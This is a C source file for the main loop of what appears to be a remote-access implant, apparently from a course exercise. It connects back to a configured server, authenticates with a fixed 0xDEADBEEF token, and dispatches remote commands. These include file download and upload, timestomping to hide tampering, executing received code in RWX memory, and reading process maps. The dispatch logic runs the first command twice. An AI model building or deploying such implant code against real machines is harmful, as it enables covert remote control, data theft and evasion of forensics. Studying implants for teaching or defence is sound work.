/* agent.c - Main entry point and command dispatcher */
//#include <stdlib.h> // for socket, exit
//#include <unistd.h> // for write
//#include <sys/socket.h> // for socket, connect
//#include <linux/in.h> // for sockaddr_in
#include "../inc/cmds.h"
#include "../inc/config.h"
#include "../inc/rpc.h"
#include "../inc/syscalls.h"
#include "../inc/types.h"
#include "../inc/utils.h"

/* ========================================================================
 * Main function
 * ======================================================================== */

static struct rpc_request g_req;
static struct rpc_response g_resp;

void handle_command(int sock_fd, uint8_t cmd_type) {
     switch (cmd_type) {
        case CMD_GET_FILE_STATS:
            //result = handle_get_file_stats(g_req.data, &g_resp);
            handle_get_file_stats(g_req.data, &g_resp);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            send_response(sock_fd, &g_resp);
            break;
        case CMD_LS:
            //result = handle_ls(g_req.data, &g_resp);
            handle_ls(g_req.data, &g_resp);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            send_response(sock_fd, &g_resp);
            break;
        case CMD_PWD:
            //result = handle_pwd(&g_resp);
            handle_pwd(&g_resp);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            send_response(sock_fd, &g_resp);
            break;
        case CMD_DOWNLOAD_FILE:
            //result = handle_download_file(sock_fd, g_req.data);
            handle_download_file(sock_fd, g_req.data);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            //send_response(sock_fd, &g_resp);
            sys_write(1, "Breaking from download switch case\n", strlen("Breaking from download switch case\n"));
            break;
        case CMD_BGREP:
            //result = handle_bgrep(sock_fd, g_req.data, g_req.data);
            handle_bgrep(sock_fd, g_req.data, g_req.data);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            //send_response(sock_fd, &g_resp);
            break;
        case CMD_TAILF:
            //result = handle_tailf(sock_fd, &g_req.data[1]);
            handle_tailf(sock_fd, &g_req.data[1]);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            //send_response(sock_fd, &g_resp);
            break;
        case CMD_CANCEL:
            // no function
            // cancel ongoing operation (ex. tailf)
            break;
        /*
        case CMD_EXIT:
            // no function
            // terminate agent connection
            sys_exit(0);
            break;
        */
        case CMD_UPLOAD_FILE:
            //result = handle_upload_file(sock_fd, g_req.data);
            handle_upload_file(sock_fd, g_req.data);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            //send_response(sock_fd, &g_resp);
            break;
        case CMD_APPEND_FILE:
            //result = handle_append_file(sock_fd, g_req.data);
            handle_append_file(sock_fd, g_req.data);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            break;
        case CMD_TIMESTOMP:
            //result = handle_timestomp(g_req.data, &g_resp);
            handle_timestomp(g_req.data, &g_resp);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            send_response(sock_fd, &g_resp); 
            break;
        case CMD_WC: 
            //result = handle_wc(g_req.data, &g_resp);
            handle_wc(g_req.data, &g_resp);
            /*
            if (result != 0) {
                // is this correct behavior on error?
                exit(1);
            }
            */
            send_response(sock_fd, &g_resp);
            break;
        case CMD_DJB2SUM:
            //result = handle_djb2sum(path, &g_resp);
            handle_djb2sum(g_req.data, &g_resp);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            send_response(sock_fd, &g_resp);
            break;
        case CMD_SED:
            //result = handle_sed(sock_fd, g_req.data);
            handle_sed(sock_fd, g_req.data);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            //send_response(sock_fd, &g_resp);
            break;
        case CMD_RUNRWX:
            //result = handle_runrwx(sock_fd, g_req.data);
            handle_runrwx(sock_fd, g_req.data);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            //send_response(sock_fd, &g_resp);
            break;
        case CMD_PROC_MAPS:
            //result = handle_proc_maps(&g_resp);
            handle_proc_maps(&g_resp);
            /*
            if (result != 0) {
                exit(1);
            }
            */
            send_response(sock_fd, &g_resp);
            break;
    }
}

void _start(void) {
    // Your solution here!
    // connect to the serer
    // handle authentication
    // event loop: get RPC Request and execute
    // send 0xDEADBEEF immediately after connecting to server

    int sock_fd = sys_socket(AF_INET, SOCK_STREAM, 0);
    char buf[20]; 
    if (sock_fd < 0) {
        sys_exit(1);
    } 
    
    struct sockaddr_in server_addr = (struct sockaddr_in){
        .sin_family = AF_INET,
        .sin_port = SERVER_PORT_NBO,
        .sin_addr = {
            htonl(SERVER_IP_OCTET_0 << 24 | SERVER_IP_OCTET_1 << 16 | SERVER_IP_OCTET_2 << 8 | SERVER_IP_OCTET_3)
        },
    };
    memset(server_addr.sin_zero, 0, 8);

    int connected = sys_connect(sock_fd, (struct sockaddr *)&server_addr, 16);
    if (connected < 0) {
        int_to_str(connected, buf, 20);
        sys_write(1, buf, 20);
        sys_exit(1);
    }

    static char const passwd[] = "\xDE\xAD\xBE\xEF";
    int sent = send_exact(sock_fd, passwd, sizeof(passwd) - 1);
    if (sent == -1) {
        sys_exit(1);
    }
    
    char response[10];
    int bytes_received = recv_exact(sock_fd, response, sizeof(response));
    if (bytes_received < 0) {
        sys_exit(1);
    }
    
    if((uint8_t)response[0] != 0x01) {
        sys_exit(1);
    }

    bytes_received = recv_exact(sock_fd, &g_req, sizeof(g_req));
    
    if (bytes_received < 1) {
        sys_exit(1);
    }
    

    // we receive an RPC Request from the server
    
    handle_command(sock_fd, g_req.cmd_type);
    //recv_exact(sock_fd, &g_req, sizeof(g_req));

    while (g_req.cmd_type != CMD_EXIT) {
        handle_command(sock_fd, g_req.cmd_type);
        recv_exact(sock_fd, &g_req, sizeof(g_req));
        sys_write(1, "recieved\n", strlen("recieved\n"));
    }

    sys_exit(1);
}
